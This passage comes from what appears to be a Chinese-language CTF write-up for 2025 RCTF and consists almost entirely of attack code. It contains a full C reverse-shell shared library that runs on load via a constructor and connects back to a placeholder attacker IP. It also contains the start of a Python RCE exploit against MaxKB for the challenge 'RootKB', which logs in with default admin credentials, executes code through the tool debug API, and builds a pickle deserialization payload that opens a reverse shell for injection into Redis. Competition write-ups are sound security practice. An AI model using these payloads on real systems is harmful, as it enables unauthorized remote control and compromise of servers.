</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// 文件名: revshell.c
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/socket.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;netinet/in.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;arpa/inet.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1>// 这是一个构造函数，当 .so 文件被加载时，它会自动运行。
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>void</span> <span class=nf>_revshell_init</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=nf>__attribute__</span><span class=p>((</span><span class=n>constructor</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>_revshell_init</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// --- 在这里修改为你自己的 IP 和端口 ---
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>ip</span> <span class=o>=</span> <span class=s>&#34;xxxx&#34;</span><span class=p>;</span> <span class=c1>// &lt;--- 修改这里
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>const</span> <span class=kt>int</span> <span class=n>port</span> <span class=o>=</span> <span class=mi>9999</span><span class=p>;</span>               <span class=c1>// &lt;--- 修改这里
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// ------------------------------------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>sockfd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>sockaddr_in</span> <span class=n>addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 1. 创建一个 socket
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>sockfd</span> <span class=o>=</span> <span class=nf>socket</span><span class=p>(</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>SOCK_STREAM</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>sockfd</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 创建失败，安静地退出
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 2. 设置要连接的目标地址和端口
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>addr</span><span class=p>.</span><span class=n>sin_family</span> <span class=o>=</span> <span class=n>AF_INET</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>addr</span><span class=p>.</span><span class=n>sin_port</span> <span class=o>=</span> <span class=nf>htons</span><span class=p>(</span><span class=n>port</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 将 IP 地址字符串转换为网络格式
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nf>inet_pton</span><span class=p>(</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>ip</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>addr</span><span class=p>.</span><span class=n>sin_addr</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>close</span><span class=p>(</span><span class=n>sockfd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 3. 连接到攻击者的监听器
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nf>connect</span><span class=p>(</span><span class=n>sockfd</span><span class=p>,</span> <span class=p>(</span><span class=k>struct</span> <span class=n>sockaddr</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>addr</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>addr</span><span class=p>))</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>close</span><span class=p>(</span><span class=n>sockfd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 4. I/O 重定向：这是最关键的一步
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// 将标准输入(0)、标准输出(1)和标准错误(2)全部重定向到我们的 socket
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>dup2</span><span class=p>(</span><span class=n>sockfd</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span> <span class=c1>// STDIN
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>dup2</span><span class=p>(</span><span class=n>sockfd</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span> <span class=c1>// STDOUT
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>dup2</span><span class=p>(</span><span class=n>sockfd</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span> <span class=c1>// STDERR
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=c1>// 5. 启动一个 shell
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// execve 会用 /bin/sh 进程替换掉当前进程
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// 因为我们已经重定向了 I/O，这个 shell 的所有输入输出都会通过 socket 传输
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>execve</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 如果 execve 成功，下面的代码将不会被执行
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>close</span><span class=p>(</span><span class=n>sockfd</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>VPS 上接收shell ，获得FLAG</p><img src=/img/2025-RCTF/4.png alt=img width=50%><h2 id=rootkb-1>RootKB&ndash;</h2><p>Python 沙箱绕过俺不会，但是打redis 触发 pickle 反序列化这个俺会，话不多说直接丢脚本</p><img src=/img/2025-RCTF/5.png alt=img width=50%><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=c1># -*- coding: utf-8 -*-</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>MaxKB RCE Exploit - Complete Attack Chain
</span></span></span><span class=line><span class=cl><span class=s2>增加：远程写文件功能 write_remote_file()
</span></span></span><span class=line><span class=cl><span class=s2>增加：Redis Pickle 注入功能 inject_pickle_payload()
</span></span></span><span class=line><span class=cl><span class=s2>修正：修复了所有 &#39;return&#39; outside function 的语法错误
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>textwrap</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pickle</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=c1># Target configuration</span>
</span></span><span class=line><span class=cl><span class=n>TARGET_URL</span> <span class=o>=</span> <span class=s2>&#34;http://xxx:8030/&#34;</span>
</span></span><span class=line><span class=cl><span class=n>USERNAME</span> <span class=o>=</span> <span class=s2>&#34;admin&#34;</span>
</span></span><span class=line><span class=cl><span class=n>PASSWORD</span> <span class=o>=</span> <span class=s2>&#34;MaxKB@123..&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># API endpoints</span>
</span></span><span class=line><span class=cl><span class=n>API_BASE</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>TARGET_URL</span><span class=si>}</span><span class=s2>/admin/api&#34;</span>
</span></span><span class=line><span class=cl><span class=n>TOOL_DEBUG_API</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>API_BASE</span><span class=si>}</span><span class=s2>/workspace/default/tool/debug&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Session setup</span>
</span></span><span class=line><span class=cl><span class=n>session</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>session</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>session</span><span class=o>.</span><span class=n>headers</span><span class=o>.</span><span class=n>update</span><span class=p>({</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;User-Agent&#39;</span><span class=p>:</span> <span class=s1>&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span> <span class=s1>&#39;application/json&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;Accept&#39;</span><span class=p>:</span> <span class=s1>&#39;application/json&#39;</span>
</span></span><span class=line><span class=cl><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>login</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    Login to MaxKB and get JWT token.
</span></span></span><span class=line><span class=cl><span class=s2>    Returns the token string on success, None on failure.
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>login_data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;username&#34;</span><span class=p>:</span> <span class=n>USERNAME</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;password&#34;</span><span class=p>:</span> <span class=n>PASSWORD</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;captcha&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>login_api</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>API_BASE</span><span class=si>}</span><span class=s2>/user/login&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>resp</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>login_api</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>login_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>resp</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=n>resp</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s1>&#39;data&#39;</span> <span class=ow>in</span> <span class=n>result</span> <span class=ow>and</span> <span class=n>result</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>]</span> <span class=ow>and</span> <span class=s1>&#39;token&#39;</span> <span class=ow>in</span> <span class=n>result</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                <span class=n>token</span> <span class=o>=</span> <span class=n>result</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>][</span><span class=s1>&#39;token&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=n>session</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s1>&#39;AUTHORIZATION&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;Bearer </span><span class=si>{</span><span class=n>token</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Login successful!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] JWT Token: </span><span class=si>{</span><span class=n>token</span><span class=p>[:</span><span class=mi>50</span><span class=p>]</span><span class=si>}</span><span class=s2>...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>token</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[-] Login failed: </span><span class=si>{</span><span class=n>result</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[-] Login request failed: </span><span class=si>{</span><span class=n>resp</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[-] Login error: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>execute_python_code</span><span class=p>(</span><span class=n>code</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Execute Python code through tool debug endpoint&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;code&#34;</span><span class=p>:</span> <span class=n>code</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;input_field_list&#34;</span><span class=p>:</span> <span class=p>[],</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;init_field_list&#34;</span><span class=p>:</span> <span class=p>[],</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;init_params&#34;</span><span class=p>:</span> <span class=p>{},</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;debug_field_list&#34;</span><span class=p>:</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>resp</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>TOOL_DEBUG_API</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>resp</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=n>resp</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(result) # Uncomment for deep debugging</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>result</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;code&#39;</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[-] Server-side error: </span><span class=si>{</span><span class=n>result</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;message&#39;</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>result</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;data&#39;</span><span class=p>,</span> <span class=s1>&#39;No data returned&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;HTTP </span><span class=si>{</span><span class=n>resp</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=n>resp</span><span class=o>.</span><span class=n>text</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;Exception: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ======================================</span>
</span></span><span class=line><span class=cl><span class=c1># ========= 新增：Pickle注入功能 =========</span>
</span></span><span class=line><span class=cl><span class=c1># ======================================</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>PickleRCE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>command</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>command</span> <span class=o>=</span> <span class=n>command</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>__reduce__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># 返回一个可调用对象和其参数</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=n>subprocess</span><span class=o>.</span><span class=n>call</span><span class=p>,</span> <span class=p>([</span><span class=s2>&#34;python3&#34;</span><span class=p>,</span><span class=s2>&#34;-c&#34;</span><span class=p>,</span><span class=s1>&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;xxxx&#34;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span><span class=p>],))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>inject_pickle_payload</span><span class=p>(</span><span class=n>redis_host</span><span class=p>,</span> <span class=n>redis_port</span><span class=p>,</span> <span class=n>redis_password</span><span class=p>,</span> <span class=n>token</span><span class=p>,</span> <span class=n>command</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    Generates a pickle payload and injects it into Redis via the RCE vulnerability.
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] Crafting pickle payload to execute command: &#39;</span><span class=si>{</span><span class=n>command</span><span class=si>}</span><span class=s2>&#39;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>pickle_payload</span> <span class=o>=</span> <span class=n>pickle</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>PickleRCE</span><span class=p>(</span><span class=n>command</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>b64_payload</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>pickle_payload</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;ascii&#39;</span><span class=p>)</span>
